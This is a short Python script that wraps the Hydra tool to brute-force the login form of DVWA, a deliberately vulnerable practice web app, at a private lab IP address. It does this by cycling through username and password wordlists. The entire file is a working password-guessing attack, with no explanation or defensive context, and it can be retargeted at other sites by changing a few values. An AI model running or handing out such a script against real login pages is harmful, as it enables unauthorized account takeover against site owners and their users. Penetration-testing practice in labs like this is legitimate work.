import os
import subprocess

# Target details
target_ip = "192.168.254.130"
login_url = "/dvwa/login.php"
fail_message = "Login failed"
user_list = "wordlists/users.txt"
pass_list = "wordlists/passwords.txt"

# Hydra command
cmd = [
    "hydra",
    "-L", user_list,
    "-P", pass_list,
    target_ip,
    "http-post-form",
    f"{login_url}:username=^USER^&password=^PASS^&Login=Login:{fail_message}"
]

# Run the command
print("[*] Running Hydra brute-force attack...")
result = subprocess.run(cmd, capture_output=True, text=True)
print(result.stdout)

# Save output
with open("hydra_output.txt", "w") as f:
    f.write(result.stdout)
print("[+] Output saved to hydra_output.txt")
